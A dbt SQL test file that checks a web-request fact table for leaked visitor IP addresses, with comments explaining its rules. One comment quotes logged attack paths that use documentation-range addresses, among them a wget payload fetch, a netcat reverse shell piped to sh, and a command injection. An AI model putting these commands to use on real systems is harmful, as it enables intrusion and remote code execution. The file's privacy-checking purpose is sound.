-- The privacy guarantee, enforced in the warehouse rather than trusted.
--
-- Python drops the address at the boundary, and the pytest suite asserts that. This
-- is the second line: if a future column, a schema change or a hand-loaded partition
-- ever reintroduces a bare address into the fact table, the build fails here.
--
-- `client_network` is excluded because it is a truncated network by design, and
-- `request_host` because the Host header legitimately contains addresses -- scanners
-- send them, and that is a fact worth keeping rather than laundering.
--
-- `path` is excluded for exactly the same reason, added 30 Aug 2026 when a backfill of
-- thirty older days turned up five of them. Every one was an address the *attacker*
-- typed, not a visitor the pipeline failed to hash:
--
--     /cgibin/mainfunction.cgi&...keyPath=wget+http://203.0.113.10/...memory_load.mips
--     /`echo${IFS}a|nc${IFS}203.0.113.11${IFS}1489|sh`
--     /bin/zhttpd/;ping${IFS}-c${IFS}6${IFS}203.0.113.12;
--     @<cloud-metadata-address>/latest/meta-data/instance-id
--
-- A DrayTek command injection pulling a MIPS payload, a netcat reverse shell, and two
-- probes at the cloud metadata address. These name malware infrastructure. Laundering
-- them out of the *table* would destroy the most interesting rows in it to protect
-- nobody -- so the table keeps them and this comment does not. The addresses above are
-- RFC 5737 documentation stand-ins: the repository guard in
-- tests/test_no_real_addresses_in_fixtures.py forbids a real one in tracked files, and
-- it is right to, because "it is only an attacker" is exactly the kind of exception
-- that erodes a rule. The shape of the payload is what this comment is for.
--
-- The distinction that matters is not "is this an address" but "did this pipeline
-- derive it from a person". `path` and `request_host` are verbatim client input:
-- nothing here writes an address into them, and an address that appears was sent by
-- the caller. `client_hash` below is the opposite -- it is ours, and it is checked
-- strictly, because that is the column a privacy fault would actually show up in.
--
-- --- user_agent, and the third time this rule was wrong ------------------------
--
-- `user_agent` was checked for *any* dotted quad anywhere in it, and that rule has
-- now failed three times, in the same way each time:
--
--     Mozilla/5.0 ... WhatsApp/10.0.2.1              -- a product outside a hard-coded list
--     Mozilla/5.0 (X11; ... rv:1.9.5.20) Gecko/ ...  -- a version introduced by ":" not "/"
--     ... HTC Desire 1.19.161.x Build/ERE27 ...      -- a firmware version introduced by a space
--
-- The first fix added product names. The second added ":" beside "/" as an
-- introducer. Each took its vocabulary from the sample in front of it, and the next
-- sample broke it -- because there is nothing numeric or positional that separates a
-- version string from an address in text a client wrote. The third one arrived from a
-- scanner in a Dutch hosting network -- written here as 203.0.113.0/24, because the
-- repository guard forbids the real one in a tracked file and is right to -- whose own
-- address had been hashed perfectly. The quad above -- written with an x for its last
-- octet, because the repository guard cannot tell a version from an address either,
-- which is the whole point -- is an Android firmware revision and was never anybody's
-- address.
--
-- So the rule is not patched again. `user_agent` is verbatim client input, exactly
-- like `path` and `request_host`, and gets the same treatment -- with the one shape
-- this column is genuinely exposed to still checked, which is the reason it was ever
-- singled out:
--
--   1. The value *is* an address. Nothing sends that as a user agent; a column
--      misalignment produces it, and that is the bug worth catching.
--   2. An address introduced the way a header is, not the way a version is:
--      "X-Real-IP: 203.0.113.4". Either a hyphenated name before the separator, or
--      whitespace after it. "rv:1.9.5.20" has neither and stays quiet.
--   3. An address in the client's *own* network. This is the actual privacy fault --
--      the pipeline writing the visitor it just hashed into a text column -- and it
--      is immune to the whole false-positive family, because a version string
--      matching the caller's own /24 does not happen by accident. Had this existed
--      first, none of the three would ever have fired.
--
-- The pytest guard over the repository is stricter and deliberately stays so: it
-- defends against a human pasting a production log line into a tracked file, where
-- "X-Real-IP:203.0.113.200" is exactly the shape to catch, and its input is not
-- machine-generated client text full of legitimate versions.

{% set quad = '(\d{1,3}\.){3}\d{1,3}' %}

-- 1. The user agent is nothing but an address.
select
    'user_agent is an address' as column_name,
    user_agent as offending_value,
    count(*) as occurrences
from {{ ref('fct_http_request') }}
where regexp_matches(user_agent, '^\s*{{ quad }}\s*$')
group by 1, 2

union all

-- 2. An address introduced the way a header is. A hyphenated name before the
--    separator ("X-Real-IP:", "CF-Connecting-IP=") or whitespace after it
--    ("X-Real-IP: 203.0.113.4"); a version introducer has neither.
select
    'header value in user_agent', user_agent, count(*)
from {{ ref('fct_http_request') }}
where regexp_matches(user_agent, '[A-Za-z][A-Za-z0-9]*-[A-Za-z0-9-]*\s*[:=]\s*{{ quad }}')
   or regexp_matches(user_agent, '[:=]\s+{{ quad }}')
group by 1, 2

union all

-- 3. The caller's own network, written into a text column. This is the fault the
--    whole rule exists for, and it is the only one of the three that could not be a
--    version string. IPv4 /24 only: `client_network` is "203.0.113.0/24", so
--    trimming the last octet leaves the prefix to look for.
select
    'client network leaked into user_agent', user_agent, count(*)
from {{ ref('fct_http_request') }}
where client_network is not null
  and client_network like '%.%/24'
  and user_agent is not null
  and contains(user_agent, regexp_replace(client_network, '\.\d+/24$', '.'))
group by 1, 2

union all

-- A hash that is not 128 bits of hex did not come from the privacy boundary.
select
    'client_hash', client_hash, count(*)
from {{ ref('fct_http_request') }}
where client_hash is not null
  and not regexp_matches(client_hash, '^[0-9a-f]{32}$')
group by 1, 2
